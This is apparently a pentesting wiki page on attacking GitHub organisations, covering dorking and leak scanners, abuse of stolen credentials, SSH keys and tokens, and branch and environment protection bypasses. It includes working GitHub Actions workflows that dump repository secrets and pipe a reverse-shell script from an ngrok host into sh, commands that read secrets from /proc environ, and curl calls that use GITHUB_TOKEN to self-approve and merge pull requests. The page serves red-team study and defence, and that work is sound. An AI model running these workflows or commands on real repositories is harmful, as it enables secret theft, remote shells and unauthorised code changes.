# Github Security

## What is Github

(From [here](https://kinsta.com/knowledgebase/what-is-github/)) At a high level, **GitHub is a website and cloud-based service that helps developers store and manage their code, as well as track and control changes to their code**.

### Basic Information

{% content-ref url="basic-github-information.md" %}
[basic-github-information.md](basic-github-information.md)
{% endcontent-ref %}

## External Recon

Github repositories can be configured as public, private and internal.&#x20;

* **Private** means that **only** people of the **organisation** will be able to access them
* **Internal** means that **only** people of the **enterprise** (an enterprise may have several organisations) will be able to access it
* **Public** means that **all internet** is going to be able to access it.

In case you know the **user, repo or organisation you want to target** you can use **github dorks** to find sensitive information or search for **sensitive information leaks** **on each repo**.

### Github Dorks

Github allows to **search for something specifying as scope a user, a repo or an organisation**. Therefore, with a list of strings that are going to appear close to sensitive information you can easily **search for potential sensitive information in your target**.

Tools (each tool contains its list of dorks):

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker) ([Dorks list](https://github.com/obheda12/GitDorker/tree/master/Dorks))
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks) ([Dorks list](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt))
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber) ([Dorks list](https://github.com/hisxo/gitGraber/tree/master/wordlists))

### Github Leaks

Please, note that the github dorks are also meant to search for leaks using github search options. This section is dedicated to those tools that will **download each repo and search for sensitive information in them** (even checking certain depth of commits).

Tools (each tool contains its list of regexes):

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

## Internal Recon

For this scenario we are going to suppose that you have obtained some access to a github account.

### With User Credentials

If you somehow already have credentials for a user inside an organization you can **just login** and check which **enterprise and organization roles you have**, if you are a raw member, check which **permissions raw members have**, in which **groups** you are, which **permissions you have** over which **repos,** and **how are the repos protected.**

Note that **2FA may be used** so you will only be able to access this information if you can also **pass that check**.

{% hint style="info" %}
Note that if you **manage to steal the `user_session` cookie** (currently configured with SameSite: Lax) you can **completely impersonate the user** without needing credentials or 2FA.
{% endhint %}

Check the section below about [**branch protections bypasses**](./#branch-protection-bypass) in case it's useful.

### With User SSH Key

Github allows **users** to set **SSH keys** that will be used as **authentication method to deploy code** on their behalf (no 2FA is applied).

With this key you can perform **changes in repositories where the user has some privileges**, however you can not sue it to access github api to enumerate the environment. However, you can get **enumerate local settings** to get information about the repos and user you have access to:

```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```

If the user has configured its username as his github username you can access the **public keys he has set** in his account in _https://github.com/\<github\_username>.keys_, you could check this to confirm the private key you found can be used.

**SSH keys** can also be set in repositories as **deploy keys**. Anyone with access to this key will be able to **launch projects from a repository**. Usually in a server with different deploy keys the local file **`~/.ssh/config`** will give you info about key is related.

#### GPG Keys

As explained [**here**](basic-github-information.md#ssh-keys) sometimes it's needed to sign the commits or you might get discovered.

Check locally if the current user has any key with:&#x20;

```shell
gpg --list-secret-keys --keyid-format=long
```

### With User Token

For an introduction about [**User Tokens check the basic information**](basic-github-information.md#personal-access-tokens).

A user token can be used **instead of a password** for Git over HTTPS, or can be used to [**authenticate to the API over Basic Authentication**](https://docs.github.com/v3/auth/#basic-authentication). Depending on the privileges attached to it you might be able to perform different actions.

A User token looks like this: `ghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123`

### With Oauth Application

For an introduction about [**Github Oauth Applications check the basic information**](basic-github-information.md#oauth-applications).

An attacker might create a **malicious Oauth Application** to access privileged data/actions of the users that accepts them probably as part of a phishing campaign.

These are the [scopes an Oauth application can request](https://docs.github.com/en/developers/apps/building-oauth-apps/scopes-for-oauth-apps). A should always check the scopes requested before accepting them.

Moreover, as explained in the basic information, **organizations can give/deny access to third party applications** to information/repos/actions related with the organisation.

### With Github Application

For an introduction about [**Github Applications check the basic information**](basic-github-information.md#github-applications).

An attacker might create a **malicious Github Application** to access privileged data/actions of the users that accepts them probably as part of a phishing campaign.

Moreover, as explained in the basic information, **organizations can give/deny access to third party applications** to information/repos/actions related with the organisation.

### With Malicious Github Action

For an introduction about [**Github Actions check the basic information**](basic-github-information.md#git-actions).

In case you can **execute arbitrary github actions** in a **repository**, you can **steal the secrets from that repo**.

#### Github Action Execution from Repo Creation

In case members of an organization can **create new repos** and you can execute github actions, you can **create a new repo and steal the secrets set at organization level**.

#### Github Action from a New Branch

If you can **create a new branch in a repository that already contains a Github Action** configured, you can **modify** it, **upload** the content, and then **execute that action from the new branch**. This way you can **exfiltrate repository and organization level secrets** (but you need to know how they are called).

You can make the modified action executable **manually,** when a **PR is created** or when **some code is pushed** (depending on how noisy you want to be):

```yaml
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - master
  push: # Run it when a push is made to a branch
    branches:
      - current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

#### Github Action Injection/Backdoor

In case you somehow managed to **infiltrate inside a Github Action**, if you can escalate privileges you can **steal secrets from the processes where secrets have been set in**. In some cases you don't even need to escalate privileges.

```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```

#### GITHUB\_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given by default read and **write permissions** **to the repo**. This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

```bash
# Merge PR
curl -X PUT \
    https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
    -d '{"commit_title":"commit_title"}'

# Approve a PR
curl -X POST \
    https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
    -d '{"event":"APPROVE"}'

# Create a PR
curl -X POST \
  -H "Accept: application/vnd.github.v3+json" \
  --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
  https://api.github.com/repos/<org_name>/<repo_name>/pulls \
  -d '{"head":"<branch_name>","base":"master", "title":"title"}'
```

{% hint style="danger" %}
Note that in several occasions you will be able to find **github user tokens inside Github Actions envs or in the secrets**. These tokens may give you more privileges over the repository and organization.
{% endhint %}

#### List secrets in Github Action output

```yaml
name: list_env
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - '**'
  push: # Run it when a push is made to a branch
    branches:
      - '**'
jobs:     
  List_env:
    runs-on: ubuntu-latest
    steps:
      - name: List Env
        # Need to base64 encode or github will change the secret value for "***"
        run: sh -c 'env | grep "secret_" | base64 -w0'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

#### Get reverse shell with secrets

```yaml
name: revshell
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - '**'
  push: # Run it when a push is made to a branch
    branches:
      - '**'
jobs:     
  create_pull_request:
    runs-on: ubuntu-latest
    steps:
      - name: Get Rev Shell
        run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

### Branch Protection Bypass

* **Require a number of approvals**: If you compromised several accounts you might just accept your PRs from other accounts. If you just have the account from where you created the PR you cannot accept your own PR. However, if you have access to a **Github Action** environment inside the repo, using the **GITHUB\_TOKEN** you might be able to **approve your PR** and get 1 approval this way.
  * _Note for this and for the Code Owners restriction that usually a user won't be able to approve his own PRs, but if you are, you can abuse it to accept your PRs._
* **Dismiss approvals when new commits are pushed**: If this isn’t set, you can submit legit code, wait till someone approves it, and put malicious code and merge it into the protected branch.
* **Require reviews from Code Owners**: If this is activated and you are a Code Owner, you could make a **Github Action create your PR and then approve it yourself**.
  * When a **CODEOWNER file is missconfigured** Github doesn't complain but it does't use it. Therefore, if it's missconfigured it's **Code Owners protection isn't applied.**
* **Allow specified actors to bypass pull request requirements**: If you are one of these actors you can bypass pull request protections.
* **Include administrators**: If this isn’t set and you are admin of the repo, you can bypass this branch protections.
* **PR Hijacking**: You could be able to **modify the PR of someone else** adding malicious code, approving the resulting PR yourself and merging everything.
* **Removing Branch Protections**: If you are an **admin of the repo you can disable the protections**, merge your PR and set the protections back.
* **Bypassing push protections**: If a repo **only allows certain users** to send push (merge code) in  branches (the branch protection might be protecting all the branches specifying the wildcard `*`).&#x20;
  * If you have **write access over the repo but you are not allowed to push code** because of the branch protection, you can still **create a new branch** and within it create a **github action that is triggered when code is pushed**. As the **branch protection won't protect the branch until it's created**, this first code push to the branch will **execute the github action**.

### Bypass Environments Protections

For an introduction about [**Github Environment check the basic information**](basic-github-information.md#git-environments).

In case an environment can be **accessed from all the branches**, it's **isn't protected** and you can easily access the secrets inside the environment. Note that you might find repos where **all the branches are protected** (by specifying its names or by using `*`) in that scenario, **find a branch were you can push code** and you can **exfiltrate** the secrets creating a new github action (or modifying one).

Note, that you might find the edge case where **all the branches are protected** (via wildcard `*`) it's specified **who can push code to the branches** (_you can specify that in the branch protection_) and **your user isn't allowed**. You can still run a custom github action because you can create a branch and use the push trigger over itself. The **branch protection allows the push to a new branch so the github action will be triggered**.

```yaml
  push: # Run it when a push is made to a branch
    branches:
      - current_branch_name #Use '**' to run when a push is made to any branch
```

Note that **after the creation** of the branch the **branch protection will apply to the new branch** and you won't be able to modify it, but for that time you will have already dumped the secrets.
